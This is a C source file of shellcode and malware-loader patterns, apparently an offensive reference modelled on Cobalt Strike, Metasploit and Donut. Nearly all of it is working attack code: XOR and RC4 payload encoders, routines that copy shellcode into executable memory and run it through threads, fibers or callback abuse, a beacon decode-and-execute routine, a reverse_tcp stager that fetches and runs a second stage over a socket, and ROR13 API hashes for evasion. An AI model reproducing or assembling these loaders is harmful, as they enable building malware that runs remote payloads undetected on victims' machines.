/*
 * Shellcode Basics - Stubs, encoders, execution patterns
 * Patterns from Cobalt Strike, Metasploit, Donut
 */

#include <windows.h>

// ============================================================================
// SHELLCODE STUBS - x64 Windows
// ============================================================================

// NOP sled
#define NOP "\x90"

// Breakpoint (debugging)
#define BRK "\xCC"

// Exit process (no API resolution needed)
// xor ecx, ecx; mov eax, 0x2c; syscall
BYTE sc_exit[] = "\x48\x31\xC9\xB8\x2C\x00\x00\x00\x0F\x05";

// Infinite loop (for debugging loader)
// jmp $
BYTE sc_loop[] = "\xEB\xFE";

// ============================================================================
// ENCODERS
// ============================================================================

// XOR single byte
#define XOR1(b,l,k) do{BYTE*_=(b);DWORD n=(l);while(n--)*_++^=(k);}while(0)

// XOR multi-byte
#define XORN(b,l,k,kl) do{BYTE*_=(b);for(DWORD i=0;i<(l);i++)_[i]^=(k)[i%(kl)];}while(0)

// Rolling XOR (Emotet pattern)
void xor_roll(BYTE* b, DWORD l, BYTE k)
{
    for(DWORD i = 0; i < l; i++) {
        BYTE t = b[i];
        b[i] ^= k;
        k = t;
    }
}

// NOT
#define NOT(b,l) do{BYTE*_=(b);DWORD n=(l);while(n--)*_=~*_,_++;}while(0)

// ADD/SUB
#define ADD(b,l,k) do{BYTE*_=(b);DWORD n=(l);while(n--)*_+++=k;}while(0)
#define SUB(b,l,k) do{BYTE*_=(b);DWORD n=(l);while(n--)*_++-=k;}while(0)

// RC4
void rc4(BYTE* d, DWORD dl, BYTE* k, DWORD kl)
{
    BYTE S[256];
    for(int i = 0; i < 256; i++) S[i] = i;
    for(int i = 0, j = 0; i < 256; i++) {
        j = (j + S[i] + k[i % kl]) & 0xFF;
        BYTE t = S[i]; S[i] = S[j]; S[j] = t;
    }
    for(DWORD n = 0, i = 0, j = 0; n < dl; n++) {
        i = (i + 1) & 0xFF;
        j = (j + S[i]) & 0xFF;
        BYTE t = S[i]; S[i] = S[j]; S[j] = t;
        d[n] ^= S[(S[i] + S[j]) & 0xFF];
    }
}

// ============================================================================
// DECODER STUBS (inline assembly patterns)
// ============================================================================

/*
 * XOR decoder stub - x64
 *
 * lea rsi, [rip + shellcode]
 * xor rcx, rcx
 * mov cl, shellcode_len
 * decode_loop:
 *   xor byte [rsi], KEY
 *   inc rsi
 *   loop decode_loop
 *   jmp shellcode
 */

#pragma pack(push,1)
typedef struct {
    BYTE lea_rsi[7];    // 48 8D 35 XX XX XX XX  ; lea rsi, [rip+off]
    BYTE xor_rcx[3];    // 48 31 C9              ; xor rcx, rcx
    BYTE mov_cl[2];     // B1 XX                 ; mov cl, len
    BYTE xor_byte[3];   // 80 36 XX              ; xor byte [rsi], key
    BYTE inc_rsi[3];    // 48 FF C6              ; inc rsi
    BYTE loop_rel[2];   // E2 F8                 ; loop -8
    // shellcode follows
} XOR_STUB;
#pragma pack(pop)

// ============================================================================
// EXECUTION PATTERNS
// ============================================================================

// Direct cast (classic)
#define EXEC(p) ((void(*)())(p))()

// VirtualAlloc + copy + exec
void exec_va(BYTE* sc, DWORD len)
{
    PVOID p = VirtualAlloc(0, len, 0x3000, 0x40);
    __movsb(p, sc, len);
    ((void(*)())p)();
}

// Two-stage (RW then RX)
void exec_2stage(BYTE* sc, DWORD len)
{
    DWORD old;
    PVOID p = VirtualAlloc(0, len, 0x3000, 0x04);
    __movsb(p, sc, len);
    VirtualProtect(p, len, 0x20, &old);
    ((void(*)())p)();
}

// Via CreateThread
void exec_thread(BYTE* sc, DWORD len)
{
    PVOID p = VirtualAlloc(0, len, 0x3000, 0x40);
    __movsb(p, sc, len);
    HANDLE h = CreateThread(0, 0, (LPTHREAD_START_ROUTINE)p, 0, 0, 0);
    WaitForSingleObject(h, INFINITE);
}

// Via fiber
void exec_fiber(BYTE* sc, DWORD len)
{
    PVOID p = VirtualAlloc(0, len, 0x3000, 0x40);
    __movsb(p, sc, len);
    ConvertThreadToFiber(0);
    PVOID f = CreateFiber(0, (LPFIBER_START_ROUTINE)p, 0);
    SwitchToFiber(f);
}

// Via callback abuse
void exec_callback(BYTE* sc, DWORD len)
{
    PVOID p = VirtualAlloc(0, len, 0x3000, 0x40);
    __movsb(p, sc, len);
    EnumChildWindows(0, (WNDENUMPROC)p, 0);
}

// ============================================================================
// NULL-FREE TECHNIQUES
// ============================================================================

/*
 * mov rax, 0      -> B8 00 00 00 00 (contains nulls)
 * xor eax, eax    -> 31 C0 (null-free)
 *
 * mov al, 0x3c    -> B0 3C (null-free)
 * push 0x3c; pop rax -> 6A 3C 58 (null-free)
 *
 * mov rax, 0x00401000 -> contains nulls
 * xor eax,eax; mov ax,0x4010; shl eax,8 -> null-free
 */

// ============================================================================
// POSITION-INDEPENDENT CODE (PIC)
// ============================================================================

/*
 * GetPC x86 - call/pop
 * E8 00 00 00 00  call $+5
 * 5B              pop ebx   ; EBX = current address
 */
BYTE getpc_call[] = "\xE8\x00\x00\x00\x00\x5B";

/*
 * GetPC x86 - FPU trick (shikata_ga_nai)
 * D9 E8           fld1
 * D9 74 24 F4     fnstenv [esp-0xC]
 * 5B              pop ebx
 */
BYTE getpc_fpu[] = "\xD9\xE8\xD9\x74\x24\xF4\x5B";

/*
 * GetPC x64 - LEA RIP-relative (native)
 * 48 8D 05 00 00 00 00  lea rax, [rip+0]
 */
BYTE getpc_lea[] = "\x48\x8D\x05\x00\x00\x00\x00";

// ============================================================================
// COBALT STRIKE BEACON STUB
// ============================================================================

#pragma pack(push,1)
typedef struct {
    DWORD size;
    BYTE  key;
    BYTE  pad[3];
    // BYTE data[];
} CS_STUB;
#pragma pack(pop)

void cs_decode_exec(CS_STUB* blob)
{
    BYTE* data = (BYTE*)(blob + 1);
    DWORD size = blob->size;
    BYTE key = blob->key;

    // XOR decode
    for(DWORD i = 0; i < size; i++)
        data[i] ^= key;

    // Execute
    PVOID p = VirtualAlloc(0, size, 0x3000, 0x40);
    __movsb(p, data, size);
    ((void(*)())p)();
}

// ============================================================================
// METASPLOIT STAGER PATTERN
// ============================================================================

/*
 * reverse_tcp stager flow:
 * 1. WSAStartup()
 * 2. socket()
 * 3. connect(ip:port)
 * 4. recv(4) -> size
 * 5. VirtualAlloc(size, RWX)
 * 6. recv(shellcode)
 * 7. call shellcode
 */

typedef PVOID (WINAPI *t_VA)(PVOID, SIZE_T, DWORD, DWORD);
typedef int   (WINAPI *t_recv)(SOCKET, char*, int, int);

void msf_stager(SOCKET s, t_VA pVA, t_recv pRecv)
{
    DWORD len;
    pRecv(s, (char*)&len, 4, 0);

    BYTE* sc = (BYTE*)pVA(0, len + 5, 0x3000, 0x40);
    BYTE* p = sc;

    // Prepend: mov edi, socket
    *p++ = 0xBF;
    *(DWORD*)p = (DWORD)s;
    p += 4;

    // Receive stage
    DWORD total = 0;
    while(total < len) {
        int n = pRecv(s, (char*)(p + total), len - total, 0);
        if(n <= 0) break;
        total += n;
    }

    // Execute
    ((void(*)())sc)();
}

// ============================================================================
// DONUT LOADER PATTERN
// ============================================================================

/*
 * Donut flow:
 * 1. Decompress (aPLib/LZNT1)
 * 2. Decrypt (AES-128-CTR or RC4)
 * 3. Parse embedded PE
 * 4. Reflective load
 * 5. Call DllMain or EXE entry
 */

// ============================================================================
// API HASHES (ROR13)
// ============================================================================

#define H_KERNEL32         0x6A4ABC5B
#define H_NTDLL            0x3CFA685D
#define H_VIRTUALALLOC     0x91AFCA54
#define H_VIRTUALPROTECT   0x7946C61B
#define H_LOADLIBRARYA     0xEC0E4E8E
#define H_GETPROCADDRESS   0x7C0DFCAA
#define H_CREATETHREAD     0x160D6838
#define H_EXITPROCESS      0x73E2D87E

// ============================================================================
// EOF
// ============================================================================
